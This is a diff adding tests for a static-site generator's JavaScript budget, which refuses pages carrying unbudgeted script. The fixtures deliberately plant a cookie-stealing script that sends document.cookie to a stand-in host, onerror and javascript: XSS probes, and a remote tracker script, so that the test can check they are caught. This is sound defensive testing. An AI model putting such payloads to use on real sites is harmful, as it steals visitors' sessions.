@@ -2430,3 +2430,88 @@ describe("`check theme` and `check plugin` (X1): every rule, on a theme that pas
     expect(out.trimEnd().split("\n").at(-1)).toContain("1 failed");
   });
 });
+
+describe("the client budget (H2): the build weighs the page it wrote, on the site that wrote it", () => {
+  const root = "corpora/_test/client-budget";
+  const dist = join(root, "dist");
+  const config = (extra = "", plugins = "[]") => writeFileSync(join(root, "snypd.yaml"), `snypd: 1\nsite: { name: B, url: https://b.example }\ntheme: { use: base }\nplugins: ${plugins}\n${extra}`);
+  const post = (body: string) => writeFileSync(join(root, "content/posts/a.md"), `---\ntitle: A\ndate: 2026-09-01\nstatus: published\n---\n\nIntro.\n\n${body}\n`);
+  const refusal = async () => { try { await build(root); return undefined; } catch (e) { return (e as Error).message; } };
+  beforeAll(() => {
+    rmSync(root, { recursive: true, force: true });
+    for (const d of ["content/posts", "content/media", "plugins/undeclared", "plugins/declared"]) mkdirSync(join(root, d), { recursive: true });
+    writeFileSync(join(root, "plugins/undeclared/end.ts"), "export default () => '<script defer src=\"https://tracker.example/t.js\"></script>';\n");
+    writeFileSync(join(root, "plugins/undeclared/snypd.yaml"), "plugin: { name: undeclared, version: 0.0.1, api: 1, slots: { body-end: ./end.ts } }\n");
+    writeFileSync(join(root, "plugins/declared/end.ts"), "export default () => '<script defer src=\"https://tracker.example/t.js\"></script>';\n");
+    writeFileSync(join(root, "plugins/declared/snypd.yaml"), "plugin: { name: declared, version: 0.0.1, api: 1, capabilities: { client: 2kb }, slots: { body-end: ./end.ts } }\n");
+  });
+  afterAll(() => rmSync(root, { recursive: true, force: true }));
+
+  test("E6: a content file's script is refused at the default budget of 0, named by page, line and weight — and the index forgets, so the next build refuses too", async () => {
+    config();
+    post("<div>\n<script>fetch('https://x.example/?c='+document.cookie)</script>\n</div>");
+    const m = (await refusal())!;
+    expect(m).toContain("1 page carries more JavaScript than this site afforded — budget 0 KB (bench.budgets.jsKb)");
+    expect(m).toMatch(/posts\/a\/index\.html — 0\.04 KB/);
+    expect(m).toContain(":5 <script>fetch('https://x.example/?c='+document.c…</script> (46 B)");   // line 5 of the page, the body truncated, the weight whole
+    expect(m).toContain("Nothing was rewritten");
+    // the transaction rolled back: no route row claims the bytes, so this is a cold build that refuses again, not a warm one that forgets
+    expect(await refusal()).toBe(m);
+    // the source is the twin: nothing was sanitised on the way — the fix is the author's, and then the page builds
+    post("<div>\n<p>no script here</p>\n</div>");
+    const r = await build(root);
+    expect(r.rendered).toBeGreaterThan(0);
+    expect(readFileSync(join(dist, "posts/a/index.html"), "utf8")).toContain("<p>no script here</p>");
+  });
+
+  test("every shape is weighed — handler, javascript: url, remote src — and a data block is not script", async () => {
+    config();
+    post(`<img src="/x.png" alt="x" onerror="alert(1)">`);
+    expect(await refusal()).toContain(`onerror="alert(1)" (8 B)`);
+    post(`<a href="javascript:alert(1)">x</a>`);
+    expect(await refusal()).toContain(`href="javascript:alert(1)"`);
+    post(`<script type="application/ld+json">{"@type":"Thing"}</script>\n\n<iframe src="https://www.youtube-nocookie.com/embed/x" title="v"></iframe>`);
+    expect(await refusal()).toBeUndefined();
+  });
+
+  test("a budget the site raised affords weighable script; lowering it re-renders every page and refuses again; a remote script nobody declared is over any budget", async () => {
+    post("<script>console.log('afforded')</script>");
+    config("bench: { budgets: { jsKb: 1 } }\n");
+    expect(await refusal()).toBeUndefined();
+    expect(readFileSync(join(dist, "posts/a/index.html"), "utf8")).toContain("console.log('afforded')");
+    // the budget is in the key: a cached page is not a page held to a budget it was never weighed against
+    config();
+    expect(await refusal()).toContain("posts/a/index.html");
+    config("bench: { budgets: { jsKb: 50 } }\n");
+    post(`<script src="https://cdn.example/lib.js"></script>`);
+    const m = (await refusal())!;
+    expect(m).toContain("budget 50 KB (bench.budgets.jsKb)");
+    expect(m).toContain("fetched from another origin and declared by nothing");
+  });
+
+  test("a site-local script is weighed by the file the build wrote, and a script that grows re-renders the page that loads it", async () => {
+    writeFileSync(join(root, "content/media/app.js"), "x".repeat(700));
+    post(`<script src="/media/app.js?v=1"></script>`);
+    config("bench: { budgets: { jsKb: 1 } }\n");
+    expect(await refusal()).toBeUndefined();
+    writeFileSync(join(root, "content/media/app.js"), "x".repeat(1500));
+    const m = (await refusal())!;
+    expect(m).toMatch(/posts\/a\/index\.html — 1\.46 KB/);
+    expect(m).toContain(`<script src="/media/app.js?v=1"> (1500 B)`);
+    rmSync(join(root, "content/media/app.js"));
+  });
+
+  test("script a plugin's slot rendered is charged at the plugin's declaration; a plugin that declared nothing has nothing to stand in", async () => {
+    post("Plain.");
+    config("bench: { budgets: { jsKb: 3 } }\n", "[undeclared]");
+    const m = (await refusal())!;
+    expect(m).toContain(`<script src="https://tracker.example/t.js"> — fetched from another origin and declared by nothing`);
+    expect(m).toContain("from plugin undeclared");
+    config("bench: { budgets: { jsKb: 3 } }\n", "[declared]");
+    expect(await refusal()).toBeUndefined();
+    // …but the declaration covers the plugin's script, not the same url written into a post on a site without the plugin
+    config("bench: { budgets: { jsKb: 3 } }\n");
+    post(`<script defer src="https://tracker.example/t.js"></script>`);
+    expect(await refusal()).toContain("declared by nothing");
+  });
+});
